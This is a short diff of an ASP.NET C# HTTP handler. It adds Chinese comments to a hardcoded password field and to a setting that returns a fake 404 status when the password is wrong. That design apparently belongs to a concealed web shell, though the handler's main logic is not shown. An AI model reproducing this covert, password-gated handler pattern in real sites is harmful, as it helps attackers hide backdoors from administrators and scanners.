@@ -1,4 +1,3 @@
-@@ -0,0 +1,325 @@
 <%@ WebHandler Language="C#" Class="Handler" %>
 using System;
 using System.Web;
@@ -12,8 +11,8 @@ using System.Data;
 
 public class Handler : IHttpHandler
 {
-    private static string PSW = "" + (0 - 2 - 5);   
-    private static int errorCode = 404;             
+    private static string PSW = "" + (0 - 2 - 5);   // 你懂的
+    private static int errorCode = 404;             // 如果密码不对，返回自定义状态码
 
     public bool IsReusable
     {
@@ -323,4 +322,4 @@ public class Handler : IHttpHandler
             return true;
         return false;
     }
-} 
+}
